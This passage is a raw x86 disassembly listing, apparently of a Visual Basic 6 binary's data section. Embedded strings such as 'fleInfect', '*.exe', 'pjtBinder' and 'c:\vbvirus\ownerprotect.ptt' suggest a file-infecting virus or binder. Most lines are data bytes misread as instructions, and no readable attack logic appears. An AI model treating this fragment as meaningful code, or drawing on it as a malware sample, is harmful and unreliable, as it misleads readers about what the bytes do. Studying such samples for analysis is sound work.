  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	00 00                	add    %al,(%eax)
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	00 c0                	add    %al,%al
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	00 00                	add    %al,(%eax)
  4023d5:	02 00                	add    (%eax),%al
  4023d7:	00 c0                	add    %al,%al
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 00                	add    %al,(%eax)
  4023dd:	02 00                	add    (%eax),%al
  4023df:	00 c0                	add    %al,%al
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	02 00                	add    (%eax),%al
  4023e7:	00 c0                	add    %al,%al
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	02 00                	add    (%eax),%al
  4023ef:	00 c0                	add    %al,%al
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	02 00                	add    (%eax),%al
  4023f7:	00 e0                	add    %ah,%al
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	00 00                	add    %al,(%eax)
  4023fd:	06                   	push   %es
  4023fe:	00 00                	add    %al,(%eax)
  402400:	e0 00                	loopne 0x402402
  402402:	00 00                	add    %al,(%eax)
  402404:	00 06                	add    %al,(%esi)
  402406:	00 00                	add    %al,(%eax)
  402408:	e0 00                	loopne 0x40240a
  40240a:	00 00                	add    %al,(%eax)
  40240c:	00 06                	add    %al,(%esi)
  40240e:	00 00                	add    %al,(%eax)
  402410:	f0 00 00             	lock add %al,(%eax)
  402413:	00 00                	add    %al,(%eax)
  402415:	0e                   	push   %cs
  402416:	00 00                	add    %al,(%eax)
  402418:	f0 00 00             	lock add %al,(%eax)
  40241b:	00 00                	add    %al,(%eax)
  40241d:	0e                   	push   %cs
  40241e:	00 00                	add    %al,(%eax)
  402420:	f8                   	clc
  402421:	00 80 01 00 1e 00    	add    %al,0x1e0001(%eax)
  402427:	00 fc                	add    %bh,%ah
  402429:	0f f8 1f             	psubb  (%edi),%mm3
  40242c:	f8                   	clc
  40242d:	3e 00 00             	add    %al,%ds:(%eax)
  402430:	fe                   	(bad)
  402431:	7f fe                	jg     0x402431
  402433:	7f fe                	jg     0x402433
  402435:	3e 00 00             	add    %al,%ds:(%eax)
  402438:	24 05                	and    $0x5,%al
  40243a:	00 46 6f             	add    %al,0x6f(%esi)
  40243d:	72 6d                	jb     0x4024ac
  40243f:	31 00                	xor    %eax,(%eax)
  402441:	2e 00 35 00 00 00 00 	add    %dh,%cs:0x0
  402448:	00 00                	add    %al,(%eax)
  40244a:	00 00                	add    %al,(%eax)
  40244c:	ee                   	out    %al,(%dx)
  40244d:	02 00                	add    (%eax),%al
  40244f:	00 c2                	add    %al,%dl
  402451:	01 00                	add    %eax,(%eax)
  402453:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  402457:	03 ff                	add    %edi,%edi
  402459:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  40245c:	00 00                	add    %al,(%eax)
  40245e:	01 09                	add    %ecx,(%ecx)
  402460:	00 66 6c             	add    %ah,0x6c(%esi)
  402463:	65 49                	gs dec %ecx
  402465:	6e                   	outsb  %ds:(%esi),(%dx)
  402466:	66 65 63 74 00 12    	arpl   %si,%gs:0x12(%eax,%eax,1)
  40246c:	04 00                	add    $0x0,%al
  40246e:	00 00                	add    %al,(%eax)
  402470:	00 78 00             	add    %bh,0x0(%eax)
  402473:	0e                   	push   %cs
  402474:	01 0b                	add    %ecx,(%ebx)
  402476:	00 00                	add    %al,(%eax)
  402478:	0d 05 00 2a 2e       	or     $0x2e2a0005,%eax
  40247d:	65 78 65             	gs js  0x4024e5
  402480:	00 12                	add    %dl,(%edx)
  402482:	ff 13                	call   *(%ebx)
  402484:	ff                   	(bad)
  402485:	ff 02                	incl   (%edx)
  402487:	04 06                	add    $0x6,%al
  402489:	00 00                	add    %al,(%eax)
  40248b:	00 34 31             	add    %dh,(%ecx,%esi,1)
  40248e:	40                   	inc    %eax
  40248f:	00 50 00             	add    %dl,0x0(%eax)
  402492:	00 00                	add    %al,(%eax)
  402494:	ce                   	into
  402495:	ef                   	out    %eax,(%dx)
  402496:	a3 0b d3 bb 82       	mov    %eax,0x82bbd30b
  40249b:	4b                   	dec    %ebx
  40249c:	8d 4f 99             	lea    -0x67(%edi),%ecx
  40249f:	18 81 24 46 6b 00    	sbb    %al,0x6b4624(%ecx)
	...
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	00 90 00 00 00 00    	add    %dl,0x0(%eax)
	...
  4024cd:	00 00                	add    %al,(%eax)
  4024cf:	00 60 0f             	add    %ah,0xf(%eax)
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	28 15 40 00 4c 00    	sub    %dl,0x4c0040
  4024de:	00 00                	add    %al,(%eax)
  4024e0:	56                   	push   %esi
  4024e1:	42                   	inc    %edx
  4024e2:	35 21 f0 1f 76       	xor    $0x761ff021,%eax
  4024e7:	62 36                	bound  %esi,(%esi)
  4024e9:	63 68 73             	arpl   %ebp,0x73(%eax)
  4024ec:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4024ef:	6c                   	insb   (%dx),%es:(%edi)
  4024f0:	00 00                	add    %al,(%eax)
  4024f2:	00 00                	add    %al,(%eax)
  4024f4:	2a 00                	sub    (%eax),%al
	...
  402502:	0a 00                	or     (%eax),%al
  402504:	04 08                	add    $0x8,%al
	...
  40250e:	00 00                	add    %al,(%eax)
  402510:	7c 25                	jl     0x402537
  402512:	40                   	inc    %eax
  402513:	00 00                	add    %al,(%eax)
  402515:	f0 34 00             	lock xor $0x0,%al
  402518:	00 ff                	add    %bh,%bh
  40251a:	ff                   	(bad)
  40251b:	ff 08                	decl   (%eax)
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 01                	add    %al,(%ecx)
  402521:	00 00                	add    %al,(%eax)
  402523:	00 01                	add    %al,(%ecx)
  402525:	00 00                	add    %al,(%eax)
  402527:	00 e9                	add    %ch,%cl
  402529:	00 00                	add    %al,(%eax)
  40252b:	00 90 24 40 00 88    	add    %dl,-0x77ffbfdc(%eax)
  402531:	24 40                	and    $0x40,%al
  402533:	00 e4                	add    %ah,%ah
  402535:	14 40                	adc    $0x40,%al
  402537:	00 78 00             	add    %bh,0x0(%eax)
  40253a:	00 00                	add    %al,(%eax)
  40253c:	81 00 00 00 8b 00    	addl   $0x8b0000,(%eax)
  402542:	00 00                	add    %al,(%eax)
  402544:	8c 00                	mov    %es,(%eax)
	...
  402556:	00 00                	add    %al,(%eax)
  402558:	46                   	inc    %esi
  402559:	69 72 65 77 61 6c 6c 	imul   $0x6c6c6177,0x65(%edx),%esi
  402560:	00 70 6a             	add    %dh,0x6a(%eax)
  402563:	74 42                	je     0x4025a7
  402565:	69 6e 64 65 72 00 00 	imul   $0x7265,0x64(%esi),%ebp
  40256c:	70 6a                	jo     0x4025d8
  40256e:	74 44                	je     0x4025b4
  402570:	69 73 6b 42 69 6e 64 	imul   $0x646e6942,0x6b(%ebx),%esi
  402577:	65 72 00             	gs jb  0x40257a
  40257a:	00 00                	add    %al,(%eax)
  40257c:	f4                   	hlt
  40257d:	01 00                	add    %eax,(%eax)
  40257f:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  402582:	40                   	inc    %eax
  402583:	00 00                	add    %al,(%eax)
  402585:	00 00                	add    %al,(%eax)
  402587:	00 00                	add    %al,(%eax)
  402589:	33 40 00             	xor    0x0(%eax),%eax
  40258c:	d0 55 40             	rclb   $1,0x40(%ebp)
  40258f:	00 fc                	add    %bh,%ah
  402591:	09 00                	or     %eax,(%eax)
  402593:	00 08                	add    %cl,(%eax)
  402595:	60                   	pusha
  402596:	40                   	inc    %eax
  402597:	00 f6                	add    %dh,%dh
  402599:	12 40 00             	adc    0x0(%eax),%al
  40259c:	00 60 40             	add    %ah,0x40(%eax)
  40259f:	00 2a                	add    %ch,(%edx)
  4025a1:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  4025a5:	00 43 00             	add    %al,0x0(%ebx)
  4025a8:	3a 00                	cmp    (%eax),%al
  4025aa:	5c                   	pop    %esp
  4025ab:	00 50 00             	add    %dl,0x0(%eax)
  4025ae:	72 00                	jb     0x4025b0
  4025b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b1:	00 67 00             	add    %ah,0x0(%edi)
  4025b4:	72 00                	jb     0x4025b6
  4025b6:	61                   	popa
  4025b7:	00 6d 00             	add    %ch,0x0(%ebp)
  4025ba:	20 00                	and    %al,(%eax)
  4025bc:	46                   	inc    %esi
  4025bd:	00 69 00             	add    %ch,0x0(%ecx)
  4025c0:	6c                   	insb   (%dx),%es:(%edi)
  4025c1:	00 65 00             	add    %ah,0x0(%ebp)
  4025c4:	73 00                	jae    0x4025c6
  4025c6:	5c                   	pop    %esp
  4025c7:	00 4d 00             	add    %cl,0x0(%ebp)
  4025ca:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4025d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d1:	00 73 00             	add    %dh,0x0(%ebx)
  4025d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d5:	00 66 00             	add    %ah,0x0(%esi)
  4025d8:	74 00                	je     0x4025da
  4025da:	20 00                	and    %al,(%eax)
  4025dc:	56                   	push   %esi
  4025dd:	00 69 00             	add    %ch,0x0(%ecx)
  4025e0:	73 00                	jae    0x4025e2
  4025e2:	75 00                	jne    0x4025e4
  4025e4:	61                   	popa
  4025e5:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4025e9:	00 53 00             	add    %dl,0x0(%ebx)
  4025ec:	74 00                	je     0x4025ee
  4025ee:	75 00                	jne    0x4025f0
  4025f0:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4025f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f5:	00 5c 00 56          	add    %bl,0x56(%eax,%eax,1)
  4025f9:	00 42 00             	add    %al,0x0(%edx)
  4025fc:	39 00                	cmp    %eax,(%eax)
  4025fe:	38 00                	cmp    %al,(%eax)
  402600:	5c                   	pop    %esp
  402601:	00 70 00             	add    %dh,0x0(%eax)
  402604:	6a 00                	push   $0x0
  402606:	74 00                	je     0x402608
  402608:	62 00                	bound  %eax,(%eax)
  40260a:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  402610:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402614:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  402618:	62 00                	bound  %eax,(%eax)
  40261a:	70 00                	jo     0x40261c
	...
  4027b0:	88 24 40             	mov    %ah,(%eax,%eax,2)
  4027b3:	00 01                	add    %al,(%ecx)
  4027b5:	00 00                	add    %al,(%eax)
  4027b7:	00 01                	add    %al,(%ecx)
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  4027be:	40                   	inc    %eax
  4027bf:	00 00                	add    %al,(%eax)
  4027c1:	00 00                	add    %al,(%eax)
  4027c3:	00 c0                	add    %al,%al
  4027c5:	32 40 00             	xor    0x0(%eax),%al
  4027c8:	ff                   	(bad)
  4027c9:	ff                   	(bad)
  4027ca:	ff                   	(bad)
  4027cb:	ff 00                	incl   (%eax)
  4027cd:	00 00                	add    %al,(%eax)
  4027cf:	00 68 2a             	add    %ch,0x2a(%eax)
  4027d2:	40                   	inc    %eax
  4027d3:	00 08                	add    %cl,(%eax)
  4027d5:	60                   	pusha
  4027d6:	40                   	inc    %eax
  4027d7:	00 00                	add    %al,(%eax)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 08                	add    %cl,(%eax)
  4027dd:	e5 1a                	in     $0x1a,%eax
	...
  4027eb:	00 30                	add    %dh,(%eax)
  4027ed:	28 40 00             	sub    %al,0x0(%eax)
  4027f0:	01 00                	add    %eax,(%eax)
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	e0 2a                	loopne 0x402820
  4027f6:	40                   	inc    %eax
  4027f7:	00 00                	add    %al,(%eax)
  4027f9:	00 00                	add    %al,(%eax)
  4027fb:	00 30                	add    %dh,(%eax)
  4027fd:	28 40 00             	sub    %al,0x0(%eax)
  402800:	01 00                	add    %eax,(%eax)
  402802:	00 00                	add    %al,(%eax)
  402804:	38 28                	cmp    %ch,(%eax)
  402806:	40                   	inc    %eax
  402807:	00 00                	add    %al,(%eax)
  402809:	00 00                	add    %al,(%eax)
  40280b:	00 34 28             	add    %dh,(%eax,%ebp,1)
  40280e:	40                   	inc    %eax
  40280f:	00 02                	add    %al,(%edx)
  402811:	00 00                	add    %al,(%eax)
  402813:	00 38                	add    %bh,(%eax)
  402815:	28 40 00             	sub    %al,0x0(%eax)
  402818:	08 00                	or     %al,(%eax)
  40281a:	b7 01                	mov    $0x1,%bh
  40281c:	68 00 6c 00 88       	push   $0x88006c00
  402821:	28 40 00             	sub    %al,0x0(%eax)
  402824:	e0 62                	loopne 0x402888
  402826:	40                   	inc    %eax
  402827:	00 00                	add    %al,(%eax)
  402829:	00 00                	add    %al,(%eax)
  40282b:	00 3c e9             	add    %bh,(%ecx,%ebp,8)
  40282e:	15 00 f0 2a 40       	adc    $0x402af000,%eax
  402833:	00 00                	add    %al,(%eax)
  402835:	2b 40 00             	sub    0x0(%eax),%eax
  402838:	40                   	inc    %eax
  402839:	00 1f                	add    %bl,(%edi)
  40283b:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40283f:	00 10                	add    %dl,(%eax)
  402841:	2b 40 00             	sub    0x0(%eax),%eax
  402844:	ff                   	(bad)
  402845:	ff                   	(bad)
  402846:	ff                   	(bad)
  402847:	ff 00                	incl   (%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 00                	add    %al,(%eax)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	00 a8 28 40 00 30    	add    %ch,0x30004028(%eax)
  402855:	ed                   	in     (%dx),%eax
  402856:	15 00 20 2b 40       	adc    $0x402b2000,%eax
  40285b:	00 ff                	add    %bh,%bh
  40285d:	ff                   	(bad)
  40285e:	ff                   	(bad)
  40285f:	ff 40 00             	incl   0x0(%eax)
  402862:	16                   	push   %ss
  402863:	00 58 00             	add    %bl,0x0(%eax)
  402866:	00 00                	add    %al,(%eax)
  402868:	9c                   	pushf
  402869:	2b 40 00             	sub    0x0(%eax),%eax
  40286c:	01 00                	add    %eax,(%eax)
  40286e:	03 00                	add    (%eax),%eax
	...
  402878:	3c 29                	cmp    $0x29,%al
  40287a:	40                   	inc    %eax
  40287b:	00 40 ed             	add    %al,-0x13(%eax)
  40287e:	15 00 ac 2b 40       	adc    $0x402bac00,%eax
  402883:	00 01                	add    %al,(%ecx)
  402885:	00 03                	add    %al,(%ebx)
  402887:	00 b4 29 40 00 c1 29 	add    %dh,0x29c10040(%ecx,%ebp,1)
  40288e:	40                   	inc    %eax
  40288f:	00 ce                	add    %cl,%dh
  402891:	29 40 00             	sub    %eax,0x0(%eax)
  402894:	db 29                	fldt   (%ecx)
  402896:	40                   	inc    %eax
  402897:	00 e8                	add    %ch,%al
  402899:	29 40 00             	sub    %eax,0x0(%eax)
  40289c:	f5                   	cmc
  40289d:	29 40 00             	sub    %eax,0x0(%eax)
  4028a0:	02 2a                	add    (%edx),%ch
  4028a2:	40                   	inc    %eax
  4028a3:	00 0f                	add    %cl,(%edi)
  4028a5:	2a 40 00             	sub    0x0(%eax),%al
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	38 28                	cmp    %ch,(%eax)
  4028ae:	40                   	inc    %eax
  4028af:	00 b8 27 40 00 be    	add    %bh,-0x41ffbfd9(%eax)
  4028b5:	14 40                	adc    $0x40,%al
  4028b7:	00 c4                	add    %al,%ah
  4028b9:	14 40                	adc    $0x40,%al
  4028bb:	00 ca                	add    %cl,%dl
  4028bd:	14 40                	adc    $0x40,%al
	...
  4028d7:	00 d3                	add    %dl,%bl
  4028d9:	29 40 00             	sub    %eax,0x0(%eax)
	...
  402940:	60                   	pusha
  402941:	28 40 00             	sub    %al,0x0(%eax)
  402944:	b8 27 40 00 be       	mov    $0xbe004027,%eax
  402949:	14 40                	adc    $0x40,%al
  40294b:	00 c4                	add    %al,%ah
  40294d:	14 40                	adc    $0x40,%al
  40294f:	00 ca                	add    %cl,%dl
  402951:	14 40                	adc    $0x40,%al
	...
  4029ab:	00 81 6c 24 04 ff    	add    %al,-0xfbdb94(%ecx)
  4029b1:	ff 00                	incl   (%eax)
  4029b3:	00 e9                	add    %ch,%cl
  4029b5:	57                   	push   %edi
  4029b6:	09 00                	or     %eax,(%eax)
  4029b8:	00 81 6c 24 04 ff    	add    %al,-0xfbdb94(%ecx)
  4029be:	ff 00                	incl   (%eax)
  4029c0:	00 e9                	add    %ch,%cl
  4029c2:	3a 0a                	cmp    (%edx),%cl
  4029c4:	00 00                	add    %al,(%eax)
  4029c6:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4029cd:	00 
  4029ce:	e9 6d 0b 00 00       	jmp    0x403540
  4029d3:	81 6c 24 04 53 00 00 	subl   $0x53,0x4(%esp)
  4029da:	00 
  4029db:	e9 90 0c 00 00       	jmp    0x403670
  4029e0:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4029e7:	00 
  4029e8:	e9 e3 18 00 00       	jmp    0x4042d0
  4029ed:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4029f4:	00 
  4029f5:	e9 26 1a 00 00       	jmp    0x404420
  4029fa:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  402a01:	00 
  402a02:	e9 99 1d 00 00       	jmp    0x4047a0
  402a07:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  402a0e:	00 
  402a0f:	e9 7c 27 00 00       	jmp    0x405190
  402a14:	00 00                	add    %al,(%eax)
  402a16:	00 00                	add    %al,(%eax)
  402a18:	2c 60                	sub    $0x60,%al
  402a1a:	40                   	inc    %eax
  402a1b:	00 80 32 40 00 ff    	add    %al,-0xffbfce(%eax)
  402a21:	ff                   	(bad)
  402a22:	ff                   	(bad)
  402a23:	ff 00                	incl   (%eax)
  402a25:	00 00                	add    %al,(%eax)
  402a27:	00 1c 60             	add    %bl,(%eax,%eiz,2)
  402a2a:	40                   	inc    %eax
  402a2b:	00 3b                	add    %bh,(%ebx)
  402a2d:	8f c6                	pop    %esi
  402a2f:	d8 32                	fdivs  (%edx)
  402a31:	44                   	inc    %esp
  402a32:	85 44 93 fe          	test   %eax,-0x2(%ebx,%edx,4)
  402a36:	ca 8f a7             	lret   $0xa78f
  402a39:	ed                   	in     (%dx),%eax
  402a3a:	cc                   	int3
  402a3b:	a8 0a                	test   $0xa,%al
  402a3d:	00 01                	add    %al,(%ecx)
  402a3f:	00 01                	add    %al,(%ecx)
  402a41:	00 01                	add    %al,(%ecx)
  402a43:	00 68 2a             	add    %ch,0x2a(%eax)
  402a46:	40                   	inc    %eax
	...
  402a53:	00 c0                	add    %al,%al
  402a55:	2a 40 00             	sub    0x0(%eax),%al
  402a58:	09 04 00             	or     %eax,(%eax,%eax,1)
  402a5b:	00 04 08             	add    %al,(%eax,%ecx,1)
  402a5e:	00 00                	add    %al,(%eax)
  402a60:	00 00                	add    %al,(%eax)
  402a62:	00 00                	add    %al,(%eax)
  402a64:	02 00                	add    (%eax),%al
  402a66:	00 00                	add    %al,(%eax)
  402a68:	b8 27 40 00 ff       	mov    $0xff004027,%eax
  402a6d:	ff                   	(bad)
  402a6e:	ff                   	(bad)
  402a6f:	ff                   	(bad)
  402a70:	b8 2b 40 00 00       	mov    $0x402b,%eax
	...
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	00 b8 2a 40 00 08    	add    %bh,0x800402a(%eax)
  402a85:	00 00                	add    %al,(%eax)
  402a87:	00 98 2a 40 00 ff    	add    %bl,-0xffbfd6(%eax)
  402a8d:	ff 00                	incl   (%eax)
  402a8f:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
  402a95:	00 00                	add    %al,(%eax)
  402a97:	00 b7 66 4f c1 b7    	add    %dh,-0x483eb09a(%edi)
  402a9d:	66 4f                	dec    %di
  402a9f:	c1 b7 66 4f c1 cc 7a 	shll   $0x7a,-0x333eb09a(%edi)
  402aa6:	43                   	inc    %ebx
  402aa7:	c1 b6 66 4f c1 34 7a 	shll   $0x7a,0x34c14f66(%esi)
  402aae:	41                   	inc    %ecx
  402aaf:	c1 bd 66 4f c1 e9 79 	sarl   $0x79,-0x163eb09a(%ebp)
  402ab6:	4b                   	dec    %ebx
  402ab7:	c1 66 72 6d          	shll   $0x6d,0x72(%esi)
  402abb:	4d                   	dec    %ebp
  402abc:	61                   	popa
  402abd:	69 6e 00 70 6a 74 44 	imul   $0x44746a70,0x0(%esi),%ebp
  402ac4:	69 73 6b 42 69 6e 64 	imul   $0x646e6942,0x6b(%ebx),%esi
  402acb:	65 72 00             	gs jb  0x402ace
  402ace:	00 00                	add    %al,(%eax)
  402ad0:	15 8a 07 32 eb       	adc    $0xeb32078a,%eax
  402ad5:	4b                   	dec    %ebx
  402ad6:	5c                   	pop    %esp
  402ad7:	45                   	inc    %ebp
  402ad8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402ad9:	45                   	inc    %ebp
  402ada:	11 aa c5 58 68 97    	adc    %ebp,-0x6897a73b(%edx)
  402ae0:	93                   	xchg   %eax,%ebx
  402ae1:	f7 9c a7 69 1c 43 49 	negl   0x49431c69(%edi,%eiz,4)
  402ae8:	97                   	xchg   %eax,%edi
  402ae9:	c4 1b                	les    (%ebx),%ebx
  402aeb:	9d                   	popf
  402aec:	17                   	pop    %ss
  402aed:	9d                   	popf
  402aee:	b5 9a                	mov    $0x9a,%ch
  402af0:	ce                   	into
  402af1:	ef                   	out    %eax,(%dx)
  402af2:	a3 0b d3 bb 82       	mov    %eax,0x82bbd30b
  402af7:	4b                   	dec    %ebx
  402af8:	8d 4f 99             	lea    -0x67(%edi),%ecx
  402afb:	18 81 24 46 6b 33    	sbb    %al,0x336b4624(%ecx)
  402b01:	1e                   	push   %ds
  402b02:	8f c7                	pop    %edi
  402b04:	54                   	push   %esp
  402b05:	5f                   	pop    %edi
  402b06:	11 4d 81             	adc    %ecx,-0x7f(%ebp)
  402b09:	41                   	inc    %ecx
  402b0a:	b5 e8                	mov    $0xe8,%ch
  402b0c:	2f                   	das
  402b0d:	c0 56 69 3a          	rclb   $0x3a,0x69(%esi)
  402b11:	4f                   	dec    %edi
  402b12:	ad                   	lods   %ds:(%esi),%eax
  402b13:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402b19:	0c 00                	or     $0x0,%al
  402b1b:	aa                   	stos   %al,%es:(%edi)
  402b1c:	00 60 d3             	add    %ah,-0x2d(%eax)
  402b1f:	93                   	xchg   %eax,%ebx
  402b20:	46                   	inc    %esi
  402b21:	6f                   	outsl  %ds:(%esi),(%dx)
  402b22:	72 6d                	jb     0x402b91
  402b24:	00 00                	add    %al,(%eax)
  402b26:	00 00                	add    %al,(%eax)
  402b28:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  402b2e:	68 10 a7 38 08       	push   $0x838a710
  402b33:	00 2b                	add    %ch,(%ebx)
  402b35:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402b38:	43                   	inc    %ebx
  402b39:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	67 72 61             	addr16 jb 0x402ba2
  402b41:	6d                   	insl   (%dx),%es:(%edi)
  402b42:	20 46 69             	and    %al,0x69(%esi)
  402b45:	6c                   	insb   (%dx),%es:(%edi)
  402b46:	65 73 5c             	gs jae 0x402ba5
  402b49:	4d                   	dec    %ebp
  402b4a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  402b51:	74 20                	je     0x402b73
  402b53:	56                   	push   %esi
  402b54:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  402b5b:	74 75                	je     0x402bd2
  402b5d:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  402b64:	38 
  402b65:	5c                   	pop    %esp
  402b66:	56                   	push   %esi
  402b67:	42                   	inc    %edx
  402b68:	36 2e 4f             	ss cs dec %edi
  402b6b:	4c                   	dec    %esp
  402b6c:	42                   	inc    %edx
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	00 56 42             	add    %dl,0x42(%esi)
  402b72:	00 00                	add    %al,(%eax)
  402b74:	28 2b                	sub    %ch,(%ebx)
  402b76:	40                   	inc    %eax
  402b77:	00 00                	add    %al,(%eax)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	00 06                	add    %al,(%esi)
  402b7d:	00 00                	add    %al,(%eax)
  402b7f:	00 09                	add    %cl,(%ecx)
  402b81:	00 00                	add    %al,(%eax)
  402b83:	00 38                	add    %bh,(%eax)
  402b85:	2b 40 00             	sub    0x0(%eax),%eax
  402b88:	70 2b                	jo     0x402bb5
  402b8a:	40                   	inc    %eax
  402b8b:	00 d0                	add    %dl,%al
  402b8d:	62 40 00             	bound  %eax,0x0(%eax)
	...
  402b98:	b8 8b 1a 00 62       	mov    $0x62001a8b,%eax
  402b9d:	4f                   	dec    %edi
  402b9e:	ad                   	lods   %ds:(%esi),%eax
  402b9f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402ba5:	0c 00                	or     $0x0,%al
  402ba7:	aa                   	stos   %al,%es:(%edi)
  402ba8:	00 60 d3             	add    %ah,-0x2d(%eax)
  402bab:	93                   	xchg   %eax,%ebx
  402bac:	66 6c                	data16 insb (%dx),%es:(%edi)
  402bae:	65 49                	gs dec %ecx
  402bb0:	6e                   	outsb  %ds:(%esi),(%dx)
  402bb1:	66 65 63 74 00 00    	arpl   %si,%gs:0x0(%eax,%eax,1)
  402bb7:	00 30                	add    %dh,(%eax)
  402bb9:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  402bbd:	00 06                	add    %al,(%esi)
  402bbf:	00 00                	add    %al,(%eax)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 34 00             	add    %dh,(%eax,%eax,1)
  402bc6:	05 01 80 ae 1a       	add    $0x1aae8001,%eax
  402bcb:	00 00                	add    %al,(%eax)
  402bcd:	00 38                	add    %bh,(%eax)
  402bcf:	00 05 01 19 00 50    	add    %al,0x50001901
  402bd5:	44                   	inc    %esp
  402bd6:	00 00                	add    %al,(%eax)
  402bd8:	3c 00                	cmp    $0x0,%al
  402bda:	01 00                	add    %eax,(%eax)
  402bdc:	40                   	inc    %eax
  402bdd:	00 01                	add    %al,(%ecx)
  402bdf:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  402be3:	00 4c 00 01          	add    %cl,0x1(%eax,%eax,1)
  402be7:	00 16                	add    %dl,(%esi)
  402be9:	00 00                	add    %al,(%eax)
  402beb:	00 04 00             	add    %al,(%eax,%eax,1)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	01 00                	add    %eax,(%eax)
	...
  402bfa:	73 01                	jae    0x402bfd
  402bfc:	ff                   	(bad)
  402bfd:	ff                   	(bad)
  402bfe:	ff                   	(bad)
  402bff:	ff 01                	incl   (%ecx)
  402c01:	00 00                	add    %al,(%eax)
  402c03:	00 04 00             	add    %al,(%eax,%eax,1)
  402c06:	00 00                	add    %al,(%eax)
  402c08:	3a 00                	cmp    (%eax),%al
  402c0a:	5c                   	pop    %esp
  402c0b:	00 00                	add    %al,(%eax)
  402c0d:	00 00                	add    %al,(%eax)
  402c0f:	00 36                	add    %dh,(%esi)
  402c11:	00 00                	add    %al,(%eax)
  402c13:	00 63 00             	add    %ah,0x0(%ebx)
  402c16:	3a 00                	cmp    (%eax),%al
  402c18:	5c                   	pop    %esp
  402c19:	00 76 00             	add    %dh,0x0(%esi)
  402c1c:	62 00                	bound  %eax,(%eax)
  402c1e:	76 00                	jbe    0x402c20
  402c20:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  402c26:	73 00                	jae    0x402c28
  402c28:	5c                   	pop    %esp
  402c29:	00 6f 00             	add    %ch,0x0(%edi)
  402c2c:	77 00                	ja     0x402c2e
  402c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  402c2f:	00 65 00             	add    %ah,0x0(%ebp)
  402c32:	72 00                	jb     0x402c34
  402c34:	70 00                	jo     0x402c36
  402c36:	72 00                	jb     0x402c38
  402c38:	6f                   	outsl  %ds:(%esi),(%dx)
  402c39:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402c3d:	00 63 00             	add    %ah,0x0(%ebx)
  402c40:	74 00                	je     0x402c42
  402c42:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  402c46:	74 00                	je     0x402c48
  402c48:	74 00                	je     0x402c4a
  402c4a:	00 00                	add    %al,(%eax)
  402c4c:	18 00                	sbb    %al,(%eax)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	5c                   	pop    %esp
  402c51:	4f                   	dec    %edi
  402c52:	05 80 21 6a 0f       	add    $0xf6a2180,%eax
  402c57:	5f                   	pop    %edi
  402c58:	0c ff                	or     $0xff,%al
  402c5a:	00 90 fa 51 76 5e    	add    %dl,0x5e7651fa(%eax)
  402c60:	d6                   	salc
  402c61:	53                   	push   %ebx
  402c62:	88 6d 39             	mov    %ch,0x39(%ebp)
